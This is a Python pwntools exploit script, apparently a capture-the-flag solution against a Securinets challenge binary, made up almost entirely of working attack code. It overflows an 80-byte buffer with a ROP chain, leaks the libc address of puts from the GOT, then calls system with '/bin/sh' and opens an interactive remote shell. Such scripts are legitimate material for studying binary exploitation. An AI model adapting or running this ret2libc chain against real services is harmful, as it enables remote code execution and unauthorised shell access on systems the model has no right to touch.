#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './main'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = 'pwn.ctf.securinets.tn', 6666

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = initialize()
rop = ROP(exe)

ret_slide = 0x0804909f # nop; ret;
buffer_size = 80

ropchain = flat([
    elf.plt['puts'],
    elf.sym['main'],
    elf.got['puts']
])

payload = flat(
    {buffer_size - len(ropchain): ropchain},
    filler=p32(ret_slide)
)

assert(len(payload) == 80)
io.sendlineafter(b'solveable?', payload)

io.recvline()
leak = unpack(io.recv(4).strip().ljust(4, b'\x00'))
libc.address = leak - libc.sym['puts']

ropchain = flat([
    libc.sym['system'],
    libc.sym['printf'],                 # any address for it to return
    next(libc.search(b"/bin/sh\x00"))
])
                
payload = flat(
    {buffer_size - len(ropchain): ropchain},
    filler=p32(ret_slide))

assert(len(payload) == 80)
io.sendlineafter(b'solveable?', payload)

info('libc base address: %#x', libc.address)
io.interactive()